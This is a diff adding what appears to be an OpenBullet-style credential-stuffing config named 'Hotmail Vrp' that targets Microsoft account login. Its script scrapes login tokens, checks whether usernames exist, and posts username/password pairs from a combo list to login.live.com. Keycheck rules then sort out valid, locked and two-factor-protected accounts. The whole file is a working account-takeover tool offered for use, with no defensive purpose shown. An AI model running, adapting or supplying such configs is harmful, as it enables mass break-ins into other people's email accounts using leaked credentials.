@@ -1,0 +1,177 @@
+[SETTINGS]
+{
+  "Name": "Hotmail Vrp ",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-03T23:08:37.2343685+03:30",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://login.live.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "client_id=" "&scope" -> VAR "ci" 
+
+PARSE "<COOKIES(OParams)>" JSON "" -> VAR "par" 
+
+PARSE "<COOKIES(MSPRequ)>" JSON "" -> VAR "smp" 
+
+PARSE "<COOKIES(MSCC)>" JSON "" -> VAR "msc" 
+
+PARSE "<COOKIES(MSPOK)>" JSON "" -> VAR "msp" 
+
+PARSE "<SOURCE>" LR "&uaid=" "\"/>" -> VAR "uaid" 
+
+REQUEST POST "https://login.live.com/GetCredentialType.srf?id=80604&uiflavor=win10host&id=80604&scid=6&Platform=Windows10&clientid=S-1-15-2-2551677095-2355568638-4209445997-2436930744-3692183382-387691378-1866284433&mkt=EN-GB&lc=2057&uaid=<uaid>" 
+  CONTENT "{\"username\":\"<USER>\",\"uaid\":\"<uaid>\",\"isOtherIdpSupported\":false,\"isFederationDisabled\":true,\"checkPhones\":false,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":false,\"isFidoSupported\":false,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":true,\"isRemoteConnectSupported\":false,\"federationFlags\":0,\"isSignup\":false,\"flowToken\":\"Dfl!MvYijTdi1nWkFqsGXJKn7rdwdPgLC0zTpufcqeydi3Nd7niosS3fbN2pSgHuIssT!YTmzcEfOlbZR7mj7gLVQRUPHoCroyA*SVlOdX4t!GKC7QGs*AeB2u1mf7Tl7QLH2gkwkfxHBUdV4c59XQPRJm1X2VZ8jSzPOItb7R96p13hIb32t47PtQKKrZiCOpFVfB*SRQrTJ*sosMrSh60$\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Referer: https://login.live.com/ppsecure/InlineLogin.srf?id=80604&scid=6&mkt=en-GB&Platform=Windows10&clientid=S-1-15-2-2551677095-2355568638-4209445997-2436930744-3692183382-387691378-1866284433" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.8,en-AU;q=0.5,en;q=0.3" 
+  HEADER "Content-type: application/json; charset=utf-8" 
+  HEADER "hpgact: 0" 
+  HEADER "hpgid: 82" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; MSAppHost/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Cookie: Cookie: MSPRequ=<smp>; uaid=<uaid>; MSCC=<msc>; OParams=<par>; MSPOK=$uuid-2ae5fc02-eb2c-4c9d-ba11-875c97c617b1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 621" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "IfExistsResult\":0" 
+  KEYCHAIN Failure OR 
+    KEY "IfExistsResult\":1" 
+
+FUNCTION URLEncode "<USER>" -> VAR "user" 
+
+REQUEST POST "https://login.live.com/ppsecure/post.srf?lw=1&fl=dob,easi2&xsup=1&code_challenge=MoAj0Kx4EIZFw5yKSv7dP5m7_flS2s6Kxjlj9Vvu59c&code_challenge_method=S256&state=rRBzWO6L2L-hsaUxdjqqHojOx59m-9HYji6fXevTseO5ii-paywhWsf9EQijQscxylZ0ebO4-SVG_GuLYcVwYQ&client_id=00000000402B5328&response_type=code&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&contextid=81BAFD6C7572DD00&bk=1615810842&uaid=571262d5d28f4dfbba3976fa6210d296&pid=15216" 
+  CONTENT "i13=0&login=<user>&loginfmt=<user>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=Dfl%21MvYijTdi1nWkFqsGXJKn7rdwdPgLC0zTpufcqeydi3Nd7niosS3fbN2pSgHuIssT%21YTmzcEfOlbZR7mj7gLVQRUPHoCroyA*SVlOdX4t%21GKC7QGs*AeB2u1mf7Tl7QLH2gkwkfxHBUdV4c59XQPRJm1X2VZ8jSzPOItb7R96p13hIb32t47PtQKKrZiCOpFVfB*SRQrTJ*sosMrSh60%24&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i2=106&i17=0&i18=&i19=223902" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Referer: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.8,en-AU;q=0.5,en;q=0.3" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; MSAppHost/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Cookie: Cookie: MSPRequ=<smp>; uaid=<uaid>; MSCC=<msc>; OParams=<par>; MSPOK=$uuid-4480baa5-249e-4e89-8c62-e2d4fdbb972c; MSPOK=$uuid-2ae5fc02-eb2c-4c9d-ba11-875c97c617b1$uuid-a4bc56d2-6d18-44de-a191-6320722153e1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 588" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "account doesn\\'t exist." 
+    KEY "incorrect" 
+    KEY "Please enter the password for your Microsoft account." 
+  KEYCHAIN Success OR 
+    KEY "action=\"https://account.live.com/recover" 
+    KEY "action=\"https://account.live.com/Abuse" 
+    KEY "action=\"https://account.live.com/ar/cancel" 
+    KEY "action=\"https://account.live.com/identity/confirm" 
+    KEY "title>Help us protect your account" 
+    KEY "action=\"https://account.live.com/RecoverAccount" 
+    KEY "action=\"https://account.live.com/Email/Confirm" 
+    KEY "action=\"https://account.live.com/Email/Confirm" 
+    KEY "action=\"https://account.live.com/Abuse" 
+    KEY "action=\"https://account.live.com/profile/accrue" 
+  KEYCHAIN Custom "SUCCESS" OR 
+    KEY "PPAuth" 
+    KEY "WLSSC" 
+    KEY "action=\"https://outlook.live.com/owa" 
+
+PARSE "<SOURCE>" LR "form name=\"fmHF\" id=\"fmHF\" action=\"" "\" method=\"post" -> VAR "2FA Type" 
+
+PARSE "<SOURCE>" LR "form name=\"fmHF\" id=\"fmHF\" action=\"" "\" method=\"post" -> VAR "url11" 
+
+FUNCTION Replace "FR-FR" "en-US" "<url11>" -> VAR "url1" 
+
+PARSE "<SOURCE>" LR "type=\"hidden\" name=\"pprid\" id=\"pprid\" value=\"" "\">" -> VAR "pprid" 
+
+PARSE "<SOURCE>" LR "type=\"hidden\" name=\"uaid\" id=\"uaid\" value=\"" "\">" -> VAR "uaid" 
+
+PARSE "<SOURCE>" LR "type=\"hidden\" name=\"ipt\" id=\"ipt\" value=\"" "\">" EncodeOutput=TRUE -> VAR "ipt" 
+
+REQUEST POST "<url1>" 
+  CONTENT "ipt=<ipt>&pprid=<pprid>&uaid=<uaid>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: tr" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 557" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://login.live.com" 
+  HEADER "referer: https://login.live.com/" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Send code" 
+    KEY "Verify online\",\"proofOptionLost\"" 
+    KEY "Your security info change is still pending" 
+    KEY "aka.ms/compliancelock" 
+  KEYCHAIN Success AND 
+    KEY "<SOURCE>" DoesNotContain "Send code" 
+    KEY "<SOURCE>" DoesNotContain "Verify online\",\"proofOptionLost\"" 
+    KEY "<SOURCE>" DoesNotContain "Your security info change is still pending" 
+    KEY "<SOURCE>" DoesNotContain "" 
+
